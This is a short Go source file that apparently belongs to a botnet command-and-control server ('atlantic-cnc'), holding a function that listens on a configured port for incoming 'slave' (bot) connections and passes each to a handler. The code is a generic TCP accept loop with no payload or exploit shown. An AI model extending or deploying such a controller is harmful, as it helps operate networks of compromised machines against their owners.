package slaves

import (
        "atlantic-cnc/core/models/json/build"
        "log"
        "net"
)

func Serve() {
        if build.Config.Slaves.Status {
                l, err := net.Listen("tcp", build.Config.Masters.SlaveHostPort)
                if err != nil {
                        log.Fatal(err)
                }

                log.Printf(" [Slaves Connection Watcher] [%s]\n", build.Config.Masters.SlaveHostPort)
                for {
                        conn, err := l.Accept()
                        if err != nil {
                                log.Println(" [SLAVES] ["+err.Error()+"]")
                                continue
                        }

                        go handle(conn)
                }
        }
}
